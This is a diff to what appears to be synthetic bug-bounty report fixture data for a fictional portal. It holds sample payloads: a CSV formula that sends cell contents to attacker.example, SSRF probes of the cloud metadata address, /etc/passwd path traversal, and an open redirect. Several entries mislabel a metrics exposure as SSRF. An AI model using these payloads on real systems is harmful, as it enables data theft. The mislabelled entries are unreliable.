+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.arvenfels-kultur.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3729,7 +3759,8 @@
           "offset": "3d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.arvenfels-kultur.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3879,7 +3910,8 @@
           "offset": "7d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.arvenfels-kultur.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4023,7 +4055,8 @@
           "offset": "5d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4191,7 +4224,8 @@
           "offset": "6d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.arvenfels-kultur.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4323,7 +4357,8 @@
           "offset": "5d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.arvenfels-kultur.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4463,7 +4498,8 @@
           "offset": "5d 23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4562,7 +4598,8 @@
           "offset": "3d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.arvenfels-kultur.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4698,7 +4735,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.arvenfels-kultur.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4862,7 +4900,8 @@
           "offset": "2d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5006,7 +5045,8 @@
           "offset": "9d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.arvenfels-kultur.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5144,7 +5184,8 @@
           "offset": "8d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.arvenfels-kultur.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5268,7 +5309,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.arvenfels-kultur.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5392,7 +5434,8 @@
           "offset": "3d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5523,7 +5566,8 @@
           "offset": "3d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.arvenfels-kultur.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5691,7 +5735,8 @@
           "offset": "8d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.arvenfels-kultur.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5822,7 +5867,8 @@
           "offset": "4d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5974,7 +6020,8 @@
           "offset": "6d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.arvenfels-kultur.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6141,7 +6188,8 @@
           "offset": "5d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.arvenfels-kultur.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6248,7 +6296,8 @@
           "offset": "17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6388,7 +6437,8 @@
           "offset": "5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.arvenfels-kultur.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6515,7 +6565,8 @@
           "offset": "3d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.arvenfels-kultur.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6669,7 +6720,8 @@
           "offset": "8d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.arvenfels-kultur.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6849,7 +6901,8 @@
           "offset": "8d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.arvenfels-kultur.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6942,7 +6995,8 @@
           "offset": "5d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7058,7 +7112,8 @@
           "offset": "17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.arvenfels-kultur.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7198,7 +7253,8 @@
           "offset": "5d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.arvenfels-kultur.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7278,7 +7334,8 @@
           "offset": "20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.arvenfels-kultur.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7414,7 +7471,8 @@
           "offset": "4d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.arvenfels-kultur.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7569,7 +7627,8 @@
           "offset": "7d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.arvenfels-kultur.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7704,7 +7763,8 @@
           "offset": "9d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.arvenfels-kultur.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7864,7 +7924,8 @@
           "offset": "7d 12h",
